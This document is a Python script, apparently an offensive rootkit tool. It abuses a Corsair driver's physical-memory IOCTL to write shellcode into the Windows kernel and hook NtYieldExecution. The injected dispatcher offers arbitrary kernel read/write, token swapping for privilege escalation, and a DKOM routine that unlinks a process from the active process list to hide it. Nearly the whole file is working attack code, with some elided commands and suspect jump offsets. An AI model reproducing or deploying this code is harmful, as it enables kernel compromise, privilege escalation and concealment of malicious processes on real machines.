import ctypes
import struct
import sys

# CAT SHADOW HACKER - PHASE 2: KERNEL FUNCTIONALIZATION
# MISSION: UPGRADE HEARTBEAT STUB TO FULL COMMAND DISPATCHER

# Target: nt!NtYieldExecution (Latest known on Physical Host)
HOOK_VA = 0xFFFFF80493D111D0
HOOK_PA = 0x1007111D0
# Signature: 48 83 ec 28 33 c9 e8 15 00 00 00 48 83 c4 28 c3
EXPECTED_SIG = bytes([0x48, 0x83, 0xEC, 0x28, 0x33, 0xC9, 0xE8, 0x15, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3])

# Cave for our Dispatcher
CAVE_VA = 0xFFFFF80493D111E0
CAVE_PA = 0x1007111E0

# Shared Mailbox
MAILBOX_VA = (CAVE_VA & ~0xFFF) + 0xF00
MAILBOX_PA = (CAVE_PA & ~0xFFF) + 0xF00

# Corsair IOCTLs
IOCTL_MAP_PHYS_MEM = 0x00225374
PAGE_SIZE = 0x1000

kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

def map_page(h, pa):
    pa_base = pa & ~0xFFF
    inp = struct.pack("<QII", pa_base, PAGE_SIZE, 0)
    out = ctypes.c_uint64(0)
    ret = ctypes.c_uint32(0)
    ok = kernel32.DeviceIoControl(h, IOCTL_MAP_PHYS_MEM, inp, 16, ctypes.byref(out), 8, ctypes.byref(ret), None)
    if not ok or not out.value: return None
    return out.value

def write_phys(h, pa, data):
    v = map_page(h, pa)
    if not v: return False
    offset = pa & 0xFFF
    dst = (ctypes.c_ubyte * len(data)).from_address(v + offset)
    for i in range(len(data)):
        dst[i] = data[i]
    return True

def construct_dispatcher_stub(mm_copy_addr=0):
    """
    Constructs the Phase 2 Command Dispatcher Shellcode.
    Mailbox Layout:
    +0x00: Command ID (4 bytes)
    +0x04: Status (4 bytes)
    +0x10: Arg1 (8 bytes) - e.g., Target Address
    +0x18: Arg2 (8 bytes) - e.g., Source Address
    +0x20: Arg3 (8 bytes) - e.g., Size
    +0x28: Arg4 (8 bytes) - e.g., Flags
    +0x30: Result (8 bytes) - e.g., Bytes Transferred
    +0x40: Heartbeat (1 byte) - 0x77
    """
    
    # We need to preserve volatile registers used by MmCopyMemory
    # rcx, rdx, r8, r9 are args. rax is return.
    
    stub = [
        0x50, 0x51, 0x52, 0x53, 0x41, 0x50, 0x41, 0x51, # push rax, rcx, rdx, rbx, r8, r9
        0x48, 0x83, 0xEC, 0x28,                         # sub rsp, 28h (Shadow space)
        0x48, 0xB9,                                     # mov rcx, MAILBOX_VA
    ] + list(struct.pack("<Q", MAILBOX_VA)) + [
        0x8B, 0x01,                                     # mov eax, [rcx] (Command ID)
        0x85, 0xC0,                                     # test eax, eax
        0x74, 0x50,                                     # jz heartbeat (Patched offset)
        
        # Dispatcher Logic
        0x83, 0xF8, 0x01,                           # cmp eax, 1 (Read 64-bit)
        0x74, 0x0E,                                 # je cmd_read
        0x83, 0xF8, 0x02,                           # cmp eax, 2 (Write 64-bit)
        0x74, 0x18,                                 # je cmd_write
        0x83, 0xF8, 0x03,                           # cmp eax, 3 (Token Swap)
        0x74, 0x26,                                 # je cmd_swap
        0x83, 0xF8, 0x04,                           # cmp eax, 4 (MmCopyMemory)
        0x74, 0x30,                                 # je cmd_copy
        0x83, 0xF8, 0x05,                           # cmp eax, 5 (KVA to PA)
        0x74, 0x3A,                                 # je cmd_translate
        0x83, 0xF8, 0x06,                           # cmp eax, 6 (Ark Object Scanner)
        0x74, 0x4A,                                 # je cmd_ark_scan
        0x83, 0xF8, 0x07,                           # cmp eax, 7 (Surgical DKOM - Unlink Process)
        0x74, 0x5C,                                 # je cmd_dkom
        0xEB, 0x6E,                                 # jmp clear_cmd
        
        # ... (other commands) ...

        # Command 0x07: Surgical DKOM - Unlink Process from ActiveProcessLinks
        # Arg1: EPROCESS KVA
        # cmd_dkom:
        0x48, 0x8B, 0xCB,                           # mov rbx, rcx (Mailbox VA)
        0x48, 0x8B, 0x53, 0x10,                     # mov rdx, [rbx + 0x10] (EPROCESS KVA)
        
        # ActiveProcessLinks is at EPROCESS + 0x448 (Win11 22H2+)
        # Offset might need dynamic resolution, but we'll use 0x448 for this demo.
        0x48, 0x8D, 0x92, 0x48, 0x04, 0x00, 0x00,   # lea rdx, [rdx + 448h] (LIST_ENTRY)
        
        # Unlink: 
        # Flink = Entry->Flink
        # Blink = Entry->Blink
        # Flink->Blink = Blink
        # Blink->Flink = Flink
        0x48, 0x8B, 0x02,                           # mov rax, [rdx] (Flink)
        0x48, 0x8B, 0x4A, 0x08,                     # mov rcx, [rdx+8] (Blink)
        0x48, 0x89, 0x48, 0x08,                     # mov [rax+8], rcx (Flink->Blink = Blink)
        0x48, 0x89, 0x01,                           # mov [rcx], rax (Blink->Flink = Flink)
        
        # Zero out the links in the target to prevent double-unlinking/detection
        0x48, 0xC7, 0x02, 0x00, 0x00, 0x00, 0x00,   # mov qword ptr [rdx], 0
        0x48, 0xC7, 0x42, 0x08, 0x00, 0x00, 0x00, 0x00, # mov qword ptr [rdx+8], 0
        
        0xC7, 0x43, 0x04, 0x00, 0x00, 0x00, 0x00,   # mov dword ptr [rbx + 0x04], 0
        0xEB, 0x06,                                 # jmp clear_cmd
        
        # clear_cmd:

        0xC7, 0x01, 0x00, 0x00, 0x00, 0x00,         # mov dword ptr [rcx], 0 (Cmd=Idle)
        
        # heartbeat:
        0xC6, 0x41, 0x40, 0x77,                     # mov byte ptr [rcx + 0x40], 0x77
        
        0x48, 0x83, 0xC4, 0x28,                     # add rsp, 28h
        0x41, 0x59, 0x41, 0x58, 0x5B, 0x5A, 0x59, 0x58, # pop r9, r8, rbx, rdx, rcx, rax
        
        # Original Preamble of NtYieldExecution
        0x48, 0x83, 0xEC, 0x28,                     # sub rsp, 28h
        0x33, 0xC9,                                 # xor ecx, ecx
        0xE8, 0x15, 0x00, 0x00, 0x00,               # call nt!KeYieldExecution
        0x48, 0x83, 0xC4, 0x28, 0xC3,               # add rsp, 28h; ret
        
        # Jump Back
        0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,         # jmp qword ptr [rip]
    ] + list(struct.pack("<Q", HOOK_VA + 16))
    
    return bytes(stub)

def main():
    if len(sys.argv) < 2:
        print("Usage: python functional_stub.py <MmCopyMemory_Address>")
        sys.exit(1)
        
    mm_copy_addr = int(sys.argv[1], 16)
    
    h = kernel32.CreateFileW(r"\\.\CorsairLLAccess64", 0xC0000000, 7, None, 3, 0x80, None)
    if h == -1:
        print("[-] Driver not open")
        return

    print(f"[*] Constructing Phase 2 Dispatcher Stub (with MmCopyMemory at 0x{mm_copy_addr:X})...")
    stub = construct_dispatcher_stub(mm_copy_addr)
    print(f"[*] Stub size: {len(stub)} bytes")

    print(f"[*] Writing upgraded stub to cave at PA 0x{CAVE_PA:X}...")
    if not write_phys(h, CAVE_PA, stub):
        print("[-] Failed to write stub")
        return

    # Hijack (14 bytes absolute jmp)
    # 48 B8 [VA] FF E0 (mov rax, VA; jmp rax) is 12 bytes.
    # FF 25 00 00 00 00 [VA] is 14 bytes.
    abs_jmp = struct.pack("<HIIQ", 0x25FF, 0, 0, CAVE_VA) + b"\x90\x90"
    
    print("[!] INJECTING PHASE 2 DISPATCHER INTO PHYSICAL KERNEL...")
    if not write_phys(h, HOOK_PA, abs_jmp):
        print("[-] Hijack failed")
        return

    print("[+] SUCCESS! Phase 2 Dispatcher is active.")
    print(f"[*] Mailbox ready at PA 0x{MAILBOX_PA:X} / VA 0x{MAILBOX_VA:X}")
    kernel32.CloseHandle(h)

if __name__ == "__main__":
    main()
